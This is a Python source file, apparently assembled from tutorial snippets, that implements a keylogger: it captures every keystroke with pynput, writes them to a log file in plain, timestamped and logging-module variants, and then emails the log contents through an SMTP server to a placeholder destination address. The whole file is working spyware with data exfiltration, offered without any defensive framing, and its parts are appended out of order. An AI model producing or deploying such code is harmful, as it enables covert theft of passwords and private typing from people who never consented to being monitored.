from pynput import keyboard
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as log:
            log.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as log:
            log.write(f" {key} ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


import datetime

def on_press(key):
    try:
        with open(log_file, "a") as log:
            log.write(f"{datetime.datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as log:
            log.write(f"{datetime.datetime.now()} - {key}\n")

import logging

logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key {key.char} pressed")
    except AttributeError:
        logging.info(f"Special Key {key} pressed")

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def send_email(log_content):
    from_addr = "your_email@example.com"
    to_addr = "destination_email@example.com"
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = "Keylogger Log"

    body = MIMEText(log_content, 'plain')
    msg.attach(body)

    server = smtplib.SMTP('smtp.example.com', 587)
    server.starttls()
    server.login(from_addr, "your_password")
    server.send_message(msg)
    server.quit()

# Call send_email with the content of log file
with open(log_file, "r") as file:
    send_email(file.read())
